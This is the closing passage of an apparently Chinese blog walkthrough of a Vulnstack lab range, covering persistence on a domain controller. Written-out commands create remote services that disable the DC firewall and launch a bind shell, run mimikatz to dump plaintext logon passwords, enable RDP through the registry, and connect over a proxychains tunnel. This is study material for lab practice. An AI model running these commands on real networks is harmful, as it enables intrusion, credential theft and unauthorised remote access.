&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png&#34; alt=&#34;image-20211114010832260&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;域控维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域控维权&#34;&gt;#&lt;/a&gt; 域控维权&lt;/h3&gt;
&lt;p&gt;再生成一个 CS 马，通过 win7 传到 DC 上&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png&#34; alt=&#34;image-20211114011638641&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;关掉 DC 的防火墙&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N create unablefirewall binpath= &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;netsh advfirewall set allprofiles state off&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N start unablefirewall&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png&#34; alt=&#34;image-20211114011840038&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;执行 shell&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N create bindshell binpath= &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;c:\cshell2.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;sc&lt;/span&gt; \\WIN-ENS&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;VR&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;TR&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;N start bindshell&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到 130 的新 shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png&#34; alt=&#34;image-20211114012104545&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;猕猴桃拿密码&lt;/p&gt;
&lt;figure class=&#34;highlight arduino&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;mimikatz privilege::debug&lt;br&gt;mimikatz sekurlsa::logonpasswords&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png&#34; alt=&#34;image-20211114012906263&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;拿到明文密码&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png&#34; alt=&#34;image-20211114013013491&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启 3389&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;Server &lt;span class=&#34;hljs-regexp&#34;&gt;/v fDenyTSConnections /&lt;/span&gt;t REG_DWORD &lt;span class=&#34;hljs-regexp&#34;&gt;/d 0 /&lt;/span&gt;f&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png&#34; alt=&#34;image-20211114013625435&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;用 kali 的 RDP 工具，走之前的 ew 代理连接&lt;/p&gt;
&lt;p&gt;&lt;code&gt;proxychains4 rdesktop 192.168.183.130&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png&#34; alt=&#34;image-20211114014338299&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者免去以上步骤，直接 CS 的 VNC&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png&#34; alt=&#34;image-20211114013338451&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&#34;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/271892.html&#34;&gt;https://www.freebuf.com/articles/web/271892.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&#34;&gt;https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.hackdig.com/09/hack-492089.htm&#34;&gt;http://www.hackdig.com/09/hack-492089.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/zy15667076526/article/details/116059592&#34;&gt;https://blog.csdn.net/zy15667076526/article/details/116059592&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2021-11-16T14:22:21.000Z</updated>
    </entry>
</feed>
